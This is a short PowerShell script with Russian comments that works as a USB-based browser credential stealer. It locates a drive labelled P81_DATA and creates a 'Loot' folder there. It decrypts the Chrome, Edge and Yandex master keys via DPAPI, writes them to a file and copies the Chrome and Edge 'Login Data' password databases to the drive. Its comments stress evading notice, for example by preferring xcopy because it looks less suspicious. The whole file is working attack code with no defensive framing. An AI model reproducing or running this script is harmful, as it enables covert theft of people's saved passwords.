# 1. Скрытное определение флешки
$d = (wmic logicaldisk get caption,volumename | findstr "P81_DATA").Split(":")[0]
if (!$d) { exit }
$u = "$($d):"

# 2. Создание директории (тихий метод)
$time = Get-Date -f "HHmm"
$dest = "$u\Loot_$time"
cmd /c "mkdir $dest 2>nul"

# 3. Дешифровка ключа (упор на незаметность)
# Используем короткие алиасы и прямой вызов методов
$bPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State",
    "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Local State"
)

foreach ($p in $bPaths) {
    if (Test-Path $p) {
        try {
            $raw = gc $p -Raw | ConvertFrom-Json
            $val = $raw.os_crypt.encrypted_key
            $bytes = [Convert]::FromBase64String($val)
            # Прямая дешифровка через DPAPI (текущий юзер)
            $dec = [Security.Cryptography.ProtectedData]::Unprotect($bytes[5..($bytes.Length-1)],$null,0)
            $key = [Convert]::ToBase64String($dec)
            
            # Запись без Out-File (через перенаправление потока в файл)
            "Key: $key" >> "$dest\keys.txt"
        } catch {}
    }
}

# 4. Копирование баз через системный xcopy (он меньше под подозрением, чем copy)
cmd /c "xcopy /y /s /q `"$env:LOCALAPPDATA\Google\Chrome\User Data\*\Login Data`" `"$dest\`" 2>nul"
cmd /c "xcopy /y /s /q `"$env:LOCALAPPDATA\Microsoft\Edge\User Data\*\Login Data`" `"$dest\`" 2>nul"

exit
